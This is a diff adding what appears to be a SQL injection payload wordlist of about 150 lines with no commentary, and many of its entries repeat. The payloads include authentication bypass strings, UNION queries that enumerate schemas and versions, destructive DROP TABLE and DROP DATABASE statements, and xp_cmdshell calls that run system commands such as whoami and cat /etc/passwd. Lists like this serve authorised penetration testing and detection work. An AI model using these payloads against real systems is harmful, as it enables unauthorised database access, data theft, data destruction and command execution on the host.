@@ -1,0 +1,150 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR 1=1 --
+' OR 1=1 LIMIT 1 --
+' OR 1=1 UNION SELECT NULL --
+'; DROP TABLE users; --
+' UNION SELECT null,null --
+' UNION SELECT @@version,null --
+' AND 1=2 UNION SELECT NULL,NULL,NULL --
+' OR 1=1; --
+';--
+'; DROP DATABASE dbname; --
+'; EXEC xp_cmdshell('dir'); --
+'; SELECT * FROM information_schema.tables; --
+' OR 1=1 -- ; SELECT * FROM users --
+' UNION ALL SELECT NULL,NULL --
+' OR 'a'='a --
+' UNION SELECT table_name, column_name FROM information_schema.columns --
+' AND 1=0 --
+' UNION SELECT version(), NULL --
+'; EXEC xp_cmdshell('net user'); --
+' AND 1=1 ORDER BY 1 --
+'%27%20OR%20'1'='1%20--
+' OR 'x'='x --
+' AND 1=2 --
+' OR 1=1; DROP TABLE users; --
+'; SELECT @@version; --
+' UNION SELECT 1,2,3 --
+' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() --
+'; EXEC xp_cmdshell('whoami'); --
+'%20AND%201%20LIKE%201 --
+'%20AND%201=1 --
+' OR 'a'='a --
+'%20AND%201=2 --
+'; EXEC xp_cmdshell('ls /'); --
+' AND 1=1 UNION ALL SELECT NULL,NULL,NULL --
+' AND 1=0 UNION SELECT NULL,NULL --
+' UNION SELECT @@version, NULL --
+' AND 1=1 AND 'a'='a --
+'; SELECT table_name FROM information_schema.tables; --
+' OR 'a'='a --
+' AND 1=0 --
+'; DROP DATABASE dbname; --
+'; DROP TABLE users; --
+'%20AND%201=2%20--
+'; EXEC xp_cmdshell('ls -la /'); --
+' OR 1=1 -- ; DROP TABLE users --
+'; EXEC xp_cmdshell('echo vulnerable > /tmp/vuln.txt'); --
+' AND 1=1 -- ; DROP TABLE users --
+'; DROP TABLE users; --
+' AND 1=0 UNION ALL SELECT NULL,NULL --
+'; EXEC xp_cmdshell('cat /etc/passwd'); --
+' UNION SELECT null,null,null --
+'; SELECT @@version; --
+'; EXEC xp_cmdshell('whoami'); --
+'; EXEC xp_cmdshell('id'); --
+' AND 1=0 UNION SELECT NULL,NULL,NULL --
+' OR '1'='1 -- ; DROP TABLE users --
+' AND 1=0; DROP TABLE users; --
+'; SELECT table_name, column_name FROM information_schema.columns; --
+'; SELECT * FROM users; --
+'; DROP TABLE users; --
+' AND 1=1 UNION SELECT 1,2,3 --
+' OR 1=1 LIMIT 1 --
+' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() --
+'; EXEC xp_cmdshell('whoami'); --
+' OR 'x'='x --
+' OR 1=1 --
+'; SELECT * FROM information_schema.tables; --
+' AND 1=1; DROP TABLE users; --
+' OR '1'='1; --
+' AND 1=0 UNION SELECT NULL,NULL; --
+' UNION SELECT version(), NULL; --
+' UNION SELECT table_name, column_name FROM information_schema.columns; --
+'%20AND%201=2%20--
+'%27%20OR%20'1'='1%20--
+' AND 1=1 -- ; DROP TABLE users --
+'; EXEC xp_cmdshell('id'); --
+'%20AND%201=1 --
+' OR 'a'='a --
+' UNION SELECT 1,2,3; --
+' AND 1=0 --
+' AND 1=1 AND 'a'='a --
+' UNION SELECT @@version, NULL; --
+'; DROP DATABASE dbname; --
+' UNION ALL SELECT NULL,NULL,NULL; --
+' AND 1=2 --
+' OR 1=1 --
+' AND 1=1 UNION ALL SELECT NULL,NULL; --
+'%20AND%201%20LIKE%201%20--
+'; EXEC xp_cmdshell('ls -la /'); --
+' OR '1'='1; --
+' AND 1=0 --
+'; SELECT table_name FROM information_schema.tables; --
+' UNION SELECT null,null,null; --
+' AND 1=0 UNION SELECT NULL,NULL; --
+'; DROP TABLE users; --
+' AND 1=1 -- ; DROP TABLE users --
+'; EXEC xp_cmdshell('echo vulnerable > /tmp/vuln.txt'); --
+' AND 1=1 UNION SELECT NULL,NULL; --
+' OR 'x'='x --
+'%27%20OR%20'1'='1%20--
+'; DROP TABLE users; --
+' OR 1=1 LIMIT 1; --
+' AND 1=1 -- ; DROP TABLE users --
+'; EXEC xp_cmdshell('cat /etc/passwd'); --
+'; EXEC xp_cmdshell('id'); --
+'; EXEC xp_cmdshell('whoami'); --
+' UNION SELECT null,null,null; --
+' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database(); --
+'; SELECT * FROM information_schema.tables; --
+' AND 1=0 UNION ALL SELECT NULL,NULL,NULL; --
+' AND 1=0; DROP TABLE users; --
+' OR '1'='1; --
+' UNION SELECT table_name, column_name FROM information_schema.columns; --
+' OR 'a'='a --
+'%20AND%201=2%20--
+' AND 1=1 UNION SELECT 1,2,3; --
+'; SELECT @@version; --
+'%20AND%201=1%20--
+' AND 1=0 --
+' OR 1=1 -- ; DROP TABLE users --
+' UNION ALL SELECT NULL,NULL,NULL; --
+' UNION SELECT @@version, NULL; --
+' OR '1'='1 -- ; DROP TABLE users --
+' UNION SELECT null,null --
+'; EXEC xp_cmdshell('whoami'); --
+' AND 1=0 UNION SELECT NULL,NULL; --
+' AND 1=1 AND 'a'='a; --
+'%27%20OR%20'1'='1%20--
+'; EXEC xp_cmdshell('ls /'); --
+' OR 'x'='x --
+' AND 1=1 -- ; DROP TABLE users --
+'; DROP DATABASE dbname; --
+'; EXEC xp_cmdshell('ls -la /'); --
+'; EXEC xp_cmdshell('cat /etc/passwd'); --
+'; EXEC xp_cmdshell('echo vulnerable > /tmp/vuln.txt'); --
+'; SELECT * FROM users; --
+' AND 1=1 UNION SELECT NULL,NULL,NULL; --
+' UNION SELECT version(), NULL; --
+' AND 1=0 UNION ALL SELECT NULL,NULL,NULL; --
+'; EXEC xp_cmdshell('id'); --
+'; EXEC xp_cmdshell('whoami'); --
+' UNION SELECT 1,2,3; --
+'%20AND%201=1%20--
+' OR '1'='1 -- ; DROP TABLE users --
+' UNION SELECT null,null,null; --
+' AND 1=0 --
+' UNION SELECT table_name, column_name FROM information_schema.columns; --
+' OR 'a'='a --
